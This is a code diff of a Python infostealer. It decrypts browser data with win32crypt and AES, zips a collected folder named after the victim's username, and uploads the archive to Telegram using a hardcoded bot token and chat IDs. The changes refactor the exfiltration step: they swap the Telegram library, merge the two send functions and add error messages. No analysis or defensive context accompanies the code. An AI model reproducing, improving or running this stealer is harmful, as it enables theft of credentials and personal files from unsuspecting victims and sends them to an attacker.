@@ -14,6 +14,7 @@ from pathlib import Path
 from Crypto.Cipher import AES
 from getpass import getuser
 from telegram import Bot
+from telebot import TeleBot, types
 from telegram import InputFile
 from win32crypt import CryptUnprotectData
 from datetime import datetime, timedelta
@@ -726,11 +727,12 @@ def operagxx():
             
 operagxx()  
 
-def create_zip(u_folder):
-    user = getuser()
+
+async def create_zip(u_folder):
+    user = os.getlogin()
 
     now = datetime.now()
-    zip_filename = f"𝑅𝑂𝐵𝑀𝑂[{now.day:02d}][{user}][{now.minute:02d}][{now.second:02d}].zip"
+    zip_filename = f"ROBMO[{now.day:02d}][{user}][{now.minute:02d}][{now.second:02d}].zip"
 
     zip_filepath = os.path.join("C:\\Users", user, "Downloads", zip_filename)
 
@@ -738,56 +740,39 @@ def create_zip(u_folder):
         shutil.make_archive(zip_filepath[:-4], 'zip', u_folder)
         return zip_filepath
     except Exception as e:
-        pass
+        print("Error al crear el archivo ZIP:", e)
         return None
 
 async def send_zip_to_telegram(zip_filepath, bot_token, chat_id):
-    bot = Bot(token=bot_token)
+    bot = TeleBot(bot_token)
 
     try:
-        user_name = getuser()  
-        user_message = f"𝐔𝐬𝐞𝐫: {user_name}"
-        await bot.send_message(chat_id=chat_id, text=user_message)
+        user_name = os.getlogin()
+        user_message = f"Usuario: {user_name}"
+        
+        bot.send_message(chat_id, user_message)
 
         with open(zip_filepath, 'rb') as zip_file:
-            await bot.send_document(chat_id=chat_id, document=InputFile(zip_file))
+            bot.send_document(chat_id, zip_file)
 
         separator_message = "═════════════════"
-        await bot.send_message(chat_id=chat_id, text=separator_message)
+        bot.send_message(chat_id, separator_message)
 
     except Exception as e:
-        pass
-    
-async def send_zip_to_user(zip_filepath, bot_token, user_id):
-    bot = Bot(token=bot_token)
+        print("Error al enviar el archivo ZIP:", e)
 
-    try:
-        user_name = getuser()  
-        user_message = f"𝐔𝐬𝐞𝐫: {user_name}"
-        await bot.send_message(chat_id=user_id, text=user_message)
-
-        with open(zip_filepath, 'rb') as zip_file:
-            await bot.send_document(chat_id=user_id, document=InputFile(zip_file))
-
-        separator_message = "═════════════════"
-        await bot.send_message(chat_id=user_id, text=separator_message)
-
-    except Exception as e:
-        pass
-    
 async def main():
     u_folder = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫")
 
-    zip_filepath = create_zip(u_folder)
-
     BOT_TOKEN = "6650505242:AAG5p1dKgEtWRG8uLOjOnzmbg8i6CD0NLoU"
     CHAT_ID = -1001933102780
-    USER_TLG_ID = 12345
+    USER_TLG_ID = 1972505293
+
+    zip_filepath = await create_zip(u_folder)
 
     if zip_filepath:
         await send_zip_to_telegram(zip_filepath, BOT_TOKEN, CHAT_ID)
-        await send_zip_to_user(zip_filepath, BOT_TOKEN, USER_TLG_ID)
-
+        await send_zip_to_telegram(zip_filepath, BOT_TOKEN, USER_TLG_ID)
         os.remove(zip_filepath)
 
 if __name__ == "__main__":
